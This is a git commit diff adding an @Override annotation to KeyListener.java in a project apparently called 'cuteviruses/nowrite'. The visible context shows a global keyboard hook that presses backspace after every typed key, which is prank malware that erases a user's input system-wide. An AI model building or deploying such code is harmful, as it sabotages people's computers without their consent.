712412fd1687004c6b0e8df9323ff91cba30af7c
Anas Elgarhy <anas.elgarhy.dev@gmail.com>
2022-06-05 09:52:53 +0200

    Add override notation

--- src/main/java/org/cuteviruses/nowrite/KeyListener.java
+++ src/main/java/org/cuteviruses/nowrite/KeyListener.java
@@ -6,6 +6,7 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import java.awt.event.KeyEvent;
 
 public class KeyListener implements NativeKeyListener {
+    @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
         MainController.getRobot().keyPress(KeyEvent.VK_BACK_SPACE);
         MainController.getRobot().delay(100);
